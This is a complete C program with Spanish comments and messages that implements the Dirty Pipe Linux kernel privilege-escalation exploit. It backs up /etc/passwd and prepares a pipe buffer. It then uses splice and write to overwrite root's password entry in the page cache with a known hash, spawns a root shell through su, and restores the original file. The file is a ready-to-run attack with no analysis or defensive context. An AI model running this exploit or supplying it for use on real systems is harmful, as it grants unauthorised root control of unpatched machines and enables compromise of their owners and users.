#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef TAMANO_PAGINA
#define TAMANO_PAGINA 4096
#endif

static void preparar_tuberia(int p[2]) {
    if (pipe(p)) abort();

    const unsigned tamano_tuberia = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    for (unsigned r = tamano_tuberia; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    for (unsigned r = tamano_tuberia; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main() {
    const char *const ruta = "/etc/passwd";

    printf("Haciendo copia de seguridad de /etc/passwd en /tmp/passwd.bak ...\n");
    FILE *archivo1 = fopen("/etc/passwd", "r");
    FILE *archivo2 = fopen("/tmp/passwd.bak", "w");

    if (archivo1 == NULL) {
        printf("Error al abrir /etc/passwd\n");
        exit(EXIT_FAILURE);
    } else if (archivo2 == NULL) {
        printf("Error al abrir /tmp/passwd.bak\n");
        fclose(archivo1);
        exit(EXIT_FAILURE);
    }

    char c;
    while ((c = fgetc(archivo1)) != EOF)
        fputc(c, archivo2);

    fclose(archivo1);
    fclose(archivo2);

    loff_t desplazamiento = 4;
    const char *const datos = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:prueba:/root:/bin/sh\n";
    printf("Estableciendo contraseña de root a \"piped\"...\n");
    const size_t tamano_datos = strlen(datos);

    if (desplazamiento % TAMANO_PAGINA == 0) {
        fprintf(stderr, "Lo siento, no se puede comenzar a escribir en un límite de página\n");
        return EXIT_FAILURE;
    }

    const loff_t proxima_pagina = (desplazamiento | (TAMANO_PAGINA - 1)) + 1;
    const loff_t fin_desplazamiento = desplazamiento + (loff_t)tamano_datos;
    if (fin_desplazamiento > proxima_pagina) {
        fprintf(stderr, "Lo siento, no se puede escribir más allá de un límite de página\n");
        return EXIT_FAILURE;
    }

    const int fd = open(ruta, O_RDONLY);
    if (fd < 0) {
        perror("fallo al abrir");
        return EXIT_FAILURE;
    }

    struct stat st;
    if (fstat(fd, &st)) { // Llamada corregida de fstat
        perror("fallo al obtener información");
        return EXIT_FAILURE;
    }

    if (desplazamiento > st.st_size) {
        fprintf(stderr, "El desplazamiento no está dentro del archivo\n");
        return EXIT_FAILURE;
    }

    if (fin_desplazamiento > st.st_size) {
        fprintf(stderr, "Lo siento, no se puede ampliar el archivo\n");
        return EXIT_FAILURE;
    }

    int p[2];
    preparar_tuberia(p);

    --desplazamiento;
    ssize_t bytes_leidos = splice(fd, &desplazamiento, p[1], NULL, 1, 0);
    if (bytes_leidos < 0) {
        perror("fallo en splice");
        return EXIT_FAILURE;
    }
    if (bytes_leidos == 0) {
        fprintf(stderr, "splice corto\n");
        return EXIT_FAILURE;
    }

    bytes_leidos = write(p[1], datos, tamano_datos);
    if (bytes_leidos < 0) {
        perror("fallo en escritura");
        return EXIT_FAILURE;
    }
    if ((size_t)bytes_leidos < tamano_datos) {
        fprintf(stderr, "escritura corta\n");
        return EXIT_FAILURE;
    }

    char *argumentos[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                "echo \\\"Restaurando /etc/passwd desde /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"¡Hecho! Abriendo shell... (ejecuta comandos ahora)\\\";"
                "/bin/sh;"
            "\" root"};
    execv("/bin/sh", argumentos);

    printf("La llamada a la función system() parece haber fallado :(\n");
    return EXIT_SUCCESS;
}
